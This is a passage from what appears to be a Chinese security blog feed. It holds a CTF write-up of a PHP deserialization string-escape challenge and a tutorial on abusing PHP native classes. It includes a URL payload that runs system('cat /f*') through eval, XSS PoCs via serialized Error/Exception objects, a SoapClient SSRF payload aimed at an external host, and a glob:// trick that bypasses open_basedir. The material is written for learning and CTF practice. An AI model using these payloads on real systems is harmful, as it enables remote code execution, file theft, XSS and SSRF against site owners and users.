class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">sing</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$x</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$xx</span></span>) </span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;x = <span class="hljs-variable">$xx</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;x);<br>        <span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;win!&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">// Thinking how to use sing?</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">jump</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$root</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$pwd</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$root</span>, <span class="hljs-variable">$pwd</span></span>) </span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;root = <span class="hljs-variable">$root</span>;<br><span class="hljs-variable language_">$this</span>-&gt;pwd = <span class="hljs-variable">$pwd</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;root);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;pwd);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hehe!&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sw</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;ikun&#x27;</span>, <span class="hljs-string">&#x27;kk&#x27;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;A&#x27;</span>]))&#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br>&#125; <br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;A&#x27;</span>];<br>    <span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;B&#x27;</span>];<br>    <span class="hljs-variable">$rap</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">jump</span>(<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>);<br>    <span class="hljs-variable">$baskerball</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$rap</span>);<br>    <span class="hljs-variable">$success</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">sw</span>(<span class="hljs-variable">$baskerball</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$success</span>;<br><br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>代码审计：</p><p>我们最终要利用eval命令执行</p><p>ikun会被替换成kk，也就是说每四个字符会逃逸两个</p><p>而我们需要逃逸  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot;;s:3:&quot;</span><span class="hljs-built_in">pwd</span><span class="hljs-string">&quot;;s:xx:&quot;</span><br></code></pre></td></tr></table></figure><p>需要18&#x2F;2个ikun</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">sing</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$x</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$xx</span></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;x=<span class="hljs-variable">$xx</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;x);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;win!&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">sing</span>(<span class="hljs-string">&quot;system(&#x27;cat /f*&#x27;);&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">seeeeer.php?A=ikunikunikunikunikunikunikunikunikun&amp;B=<span class="hljs-string">&quot;;s:3:&quot;</span><span class="hljs-keyword">pwd</span><span class="hljs-string">&quot;;O:4:&quot;</span>sing<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>x<span class="hljs-string">&quot;;s:18:&quot;</span><span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /f*&#x27;</span>);<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/../images/image-20231215191845070.png" alt="image-20231215191845070"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;天命之子&quot;&gt;&lt;a href=&quot;#天命之子&quot; class=&quot;headerlink&quot; title=&quot;天命之子&quot;&gt;&lt;/a&gt;天命之子&lt;/h1&gt;&lt;p&gt;打开环境&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;g</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>php原生类</title>
    <link href="http://example.com/2023/12/15/php%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
    <id>http://example.com/2023/12/15/php%E5%8E%9F%E7%94%9F%E7%B1%BB/</id>
    <published>2023-12-15T09:24:45.000Z</published>
    <updated>2023-12-15T09:27:05.884Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>新生赛遇到了一道题需要利用PHP原生类，由于自己很菜，花了很长时间才做出来。趁周末有时间总结一下常见的PHP原生类</p><ul><li>Error</li><li>Exception</li><li>SoapClient</li><li>Directorylterator</li><li>SimpleXMLElement</li></ul><h1 id="Error-Exception"><a href="#Error-Exception" class="headerlink" title="Error&#x2F;Exception"></a>Error&#x2F;Exception</h1><h2 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h2><ul><li>适用于php7</li><li>开启报错</li></ul><h3 id="Error类"><a href="#Error类" class="headerlink" title="Error类"></a>Error类</h3><p><strong>类摘要</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">Error</span> <span class="hljs-keyword">implements</span> <span class="hljs-built_in">Throwable</span> &#123;<br>    <span class="hljs-comment">/* 属性 */</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$file</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$line</span> ;<br>    <span class="hljs-comment">/* 方法 */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> = <span class="hljs-string">&quot;&quot;</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> = <span class="hljs-number">0</span> , <span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$previous</span> = <span class="hljs-literal">null</span> )<br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getMessage</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getPrevious</span> ( ) : <span class="hljs-built_in">Throwable</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getCode</span> ( ) : <span class="hljs-keyword">mixed</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getFile</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getLine</span> ( ) : <span class="hljs-keyword">int</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTrace</span> ( ) : <span class="hljs-keyword">array</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTraceAsString</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__toString</span> ( ) : <span class="hljs-keyword">string</span><br> <br></code></pre></td></tr></table></figure><p><strong>类属性</strong></p><ul><li>message：错误消息内容</li><li>code：错误代码</li><li>file：抛出错误的文件名</li><li>line：抛出错误在该文件中的行数</li></ul><p><strong>类方法</strong></p><ul><li><a href="https://www.php.net/manual/zh/error.construct.php"><code>Error::__construct</code></a> — 初始化 error 对象</li><li><a href="https://www.php.net/manual/zh/error.getmessage.php"><code>Error::getMessage</code></a> — 获取错误信息</li><li><a href="https://www.php.net/manual/zh/error.getprevious.php"><code>Error::getPrevious</code></a> — 返回先前的 Throwable</li><li><a href="https://www.php.net/manual/zh/error.getcode.php"><code>Error::getCode</code></a> — 获取错误代码</li><li><a href="https://www.php.net/manual/zh/error.getfile.php"><code>Error::getFile</code></a> — 获取错误发生时的文件</li><li><a href="https://www.php.net/manual/zh/error.getline.php"><code>Error::getLine</code></a> — 获取错误发生时的行号</li><li><a href="https://www.php.net/manual/zh/error.gettrace.php"><code>Error::getTrace</code></a> — 获取调用栈（stack trace）</li><li><a href="https://www.php.net/manual/zh/error.gettraceasstring.php"><code>Error::getTraceAsString</code></a> — 获取字符串形式的调用栈（stack trace）</li><li><a href="https://www.php.net/manual/zh/error.tostring.php"><code>Error::__toString</code></a> — error 的字符串表达</li><li><a href="https://www.php.net/manual/zh/error.clone.php"><code>Error::__clone</code></a> — 克隆 error</li></ul><h3 id="使用Error内置类来构造xss"><a href="#使用Error内置类来构造xss" class="headerlink" title="使用Error内置类来构造xss"></a>使用Error内置类来构造xss</h3><p>Error类是php的一个内置类，用于自定义一个Error。由于它内置的__toString()方法，在php7下可能造成xss，常用于反序列化中。</p><p>当php对象被当作字符串输出时，会触发__toString方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;whoami&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>PoC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/../images/image-20231215153028854.png" alt="image-20231215153028854"></p><h2 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h2><ul><li>适用于php5、7</li><li>开启报错</li></ul><h3 id="Exception类"><a href="#Exception类" class="headerlink" title="Exception类"></a>Exception类</h3><p><strong>类摘要</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">Exception</span> &#123;<br>    <span class="hljs-comment">/* 属性 */</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$file</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$line</span> ;<br>    <span class="hljs-comment">/* 方法 */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> = <span class="hljs-string">&quot;&quot;</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> = <span class="hljs-number">0</span> , <span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$previous</span> = <span class="hljs-literal">null</span> )<br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getMessage</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getPrevious</span> ( ) : <span class="hljs-built_in">Throwable</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getCode</span> ( ) : <span class="hljs-keyword">mixed</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getFile</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getLine</span> ( ) : <span class="hljs-keyword">int</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTrace</span> ( ) : <span class="hljs-keyword">array</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTraceAsString</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__toString</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">private</span> <span class="hljs-title function_ invoke__">__clone</span> ( ) : <span class="hljs-keyword">void</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>类属性</strong></p><ul><li>message：错误消息内容</li><li>code：错误代码</li><li>file：抛出错误的文件名</li><li>line：抛出错误在该文件中的行数</li></ul><p><strong>类方法</strong></p><ul><li><a href="https://www.php.net/manual/zh/exception.construct.php"><code>Exception::__construct</code></a> — 异常构造函数</li><li><a href="https://www.php.net/manual/zh/exception.getmessage.php"><code>Exception::getMessage</code></a> — 获取异常消息内容</li><li><a href="https://www.php.net/manual/zh/exception.getprevious.php"><code>Exception::getPrevious</code></a> — 返回异常链中的前一个异常</li><li><a href="https://www.php.net/manual/zh/exception.getcode.php"><code>Exception::getCode</code></a> — 获取异常代码</li><li><a href="https://www.php.net/manual/zh/exception.getfile.php"><code>Exception::getFile</code></a> — 创建异常时的程序文件名称</li><li><a href="https://www.php.net/manual/zh/exception.getline.php"><code>Exception::getLine</code></a> — 获取创建的异常所在文件中的行号</li><li><a href="https://www.php.net/manual/zh/exception.gettrace.php"><code>Exception::getTrace</code></a> — 获取异常追踪信息</li><li><a href="https://www.php.net/manual/zh/exception.gettraceasstring.php"><code>Exception::getTraceAsString</code></a> — 获取字符串类型的异常追踪信息</li><li><a href="https://www.php.net/manual/zh/exception.tostring.php"><code>Exception::__toString</code></a> — 将异常对象转换为字符串</li><li><a href="https://www.php.net/manual/zh/exception.clone.php"><code>Exception::__clone</code></a> — 异常克隆</li></ul><h3 id="使用Exception类构造xss"><a href="#使用Exception类构造xss" class="headerlink" title="使用Exception类构造xss"></a>使用Exception类构造xss</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;whoami&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>PoC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/../images/image-20231215153244269.png" alt="image-20231215153244269"></p><h1 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h1><p>SoapClinet是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问web服务的PHP客户端</p><p><strong>类摘要</strong></p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs smali">SoapClient &#123;<br>    /* 方法 */<br>   <span class="hljs-keyword"> public</span> __construct ( string|null $wsdl ,<span class="hljs-built_in"> array </span>$options = [] )<br>   <span class="hljs-keyword"> public</span> __call ( string $name ,<span class="hljs-built_in"> array </span>$args )<span class="hljs-keyword"> :</span> mixed<br>   <span class="hljs-keyword"> public</span> __doRequest ( string $request , string $location , string $action ,<span class="hljs-built_in"> int </span>$version , bool $oneWay = false )<span class="hljs-keyword"> :</span> string|null<br>   <span class="hljs-keyword"> public</span> __getCookies ( )<span class="hljs-keyword"> :</span><span class="hljs-built_in"> array</span><br><span class="hljs-built_in"></span>   <span class="hljs-keyword"> public</span> __getFunctions ( )<span class="hljs-keyword"> :</span> array|null<br>   <span class="hljs-keyword"> public</span> __getLastRequest ( )<span class="hljs-keyword"> :</span> string|null<br>   <span class="hljs-keyword"> public</span> __getLastRequestHeaders ( )<span class="hljs-keyword"> :</span> string|null<br>   <span class="hljs-keyword"> public</span> __getLastResponse ( )<span class="hljs-keyword"> :</span> string|null<br>   <span class="hljs-keyword"> public</span> __getLastResponseHeaders ( )<span class="hljs-keyword"> :</span> string|null<br>   <span class="hljs-keyword"> public</span> __getTypes ( )<span class="hljs-keyword"> :</span> array|null<br>   <span class="hljs-keyword"> public</span> __setCookie ( string $name , string|null $value = null )<span class="hljs-keyword"> :</span> void<br>   <span class="hljs-keyword"> public</span> __setLocation ( string $location = <span class="hljs-string">&quot;&quot;</span> )<span class="hljs-keyword"> :</span> string|null<br>   <span class="hljs-keyword"> public</span> __setSoapHeaders ( SoapHeader|array|null $headers = null )<span class="hljs-keyword"> :</span> bool<br>   <span class="hljs-keyword"> public</span> __soapCall ( string $name ,<span class="hljs-built_in"> array </span>$args , array|null $options = null , SoapHeader|array|null $inputHeaders = null ,<span class="hljs-built_in"> array </span>&amp;$outputHeaders = null )<span class="hljs-keyword"> :</span> mixed<br>&#125;<br></code></pre></td></tr></table></figure><p>当__call方法被触发后，可以发送http和https请求。</p><p>该类构造函数如下</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">public</span> SoapClient <span class="hljs-type">:: SoapClient</span>(mixed $wsdl <span class="hljs-meta">[</span>，<span class="hljs-built_in">array</span> $options <span class="hljs-meta">]</span>)<br></code></pre></td></tr></table></figure><ul><li>第一个参数用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式</li><li>第二个参数为一个数组，如果在wsdl模式下，该参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是将请求发送到SOAP服务器的URL，uri则是SOAP服务的目标命名空间。</li></ul><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://47.xxx.xxx.72:2333/aaa&#x27;</span>, <span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://47.xxx.xxx.72:2333&#x27;</span>));<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();    <span class="hljs-comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>由于环境问题，没有用nc演示</p><h1 id="Directorylterator"><a href="#Directorylterator" class="headerlink" title="Directorylterator"></a>Directorylterator</h1><p>Directorylterator类提供了一个用于查看文件系统目录内容的简单接口</p><p>Directorylterator与glob:&#x2F;&#x2F;协议结合将无视open_basedir对目录的限制，可用来列举指定目录下的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;whoami&#x27;</span>];<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-variable">$dir</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输入?whoami&#x3D;glob:&#x2F;&#x2F;&#x2F;*即可列出根目录下的文件</p><p><img src="/../images/image-20231215161339993.png" alt="image-20231215161339993"></p><h1 id="Filesystemlterator"><a href="#Filesystemlterator" class="headerlink" title="Filesystemlterator"></a>Filesystemlterator</h1><p>与Directorylterator类相同，提供了一个用于查看文件系统目录内容的简单接口</p><p>该类的构造方法将会创建一个指定目录的迭代器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br></code></pre></td></tr></table></figure><h1 id="Globlterator"><a href="#Globlterator" class="headerlink" title="Globlterator"></a>Globlterator</h1><p>与filesystemlterator和directorylterator作用类似，也可以遍历一个文件目录，使用方法与前两个也类似</p><p>不同的是其行为类似glob()，可以通过模式匹配来寻找文件路径</p><p><strong>类摘要</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">GlobIterator</span> <span class="hljs-keyword">extends</span> <span class="hljs-built_in">FilesystemIterator</span> <span class="hljs-keyword">implements</span> <span class="hljs-built_in">SeekableIterator</span> , <span class="hljs-built_in">Countable</span> &#123;<br>    <span class="hljs-comment">/* 方法 */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$pattern</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">KEY_AS_PATHNAME</span> | <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">CURRENT_AS_FILEINFO</span> )<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">count</span> ( ) : <span class="hljs-keyword">int</span><br>    <span class="hljs-comment">/* 继承的方法 */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">__construct</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$path</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">KEY_AS_PATHNAME</span> | <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">CURRENT_AS_FILEINFO</span> | <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">SKIP_DOTS</span> )<br>    <span class="hljs-keyword">public</span> <span class="hljs-title 